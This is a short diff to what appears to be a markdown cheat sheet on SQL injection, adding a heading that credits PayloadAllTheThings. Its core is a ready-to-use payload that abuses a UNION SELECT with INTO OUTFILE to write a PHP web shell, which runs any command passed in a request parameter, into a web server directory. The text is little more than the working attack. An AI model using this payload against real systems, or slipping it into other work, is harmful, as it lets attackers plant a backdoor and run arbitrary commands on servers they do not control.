@@ -1,5 +1,6 @@
 # SQL Injection
 
+## Into outfile method (PayloadAllTheThings)
 - SQL Injection write to file via shell
 ```
 test' union select '<?php echo system($_REQUEST["bingo"]); ?>' into outfile '/srv/http/cmd.php' -- -
